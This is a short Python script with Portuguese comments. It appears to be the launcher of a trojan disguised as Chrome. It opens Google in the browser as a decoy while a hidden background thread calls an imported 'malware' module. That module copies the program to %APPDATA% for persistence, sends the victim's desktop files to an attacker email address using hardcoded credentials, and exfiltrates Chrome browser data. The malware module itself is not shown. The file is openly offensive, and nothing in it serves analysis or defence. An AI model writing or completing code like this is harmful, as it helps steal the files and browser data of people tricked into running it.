# main.py
import subprocess
import threading
import malware
import os
import time
import webbrowser

def launch_chrome():
    """Abre o Chrome real (navegador padrão no Google)"""
    webbrowser.open("https://www.google.com")

def run_payload():
    """Executa o payload malicioso em background"""
    malware.copy_to_appdata()  # Copia para %APPDATA% e ativa persistência
    malware.steal_desktop_files("attacker@protonmail.com", "senha123")
    malware.exfil_chrome_data()

# Executa as duas ações simultaneamente
if __name__ == "__main__":
    threading.Thread(target=run_payload, daemon=True).start()
    time.sleep(2)  # Espera leve para suavizar
    launch_chrome()
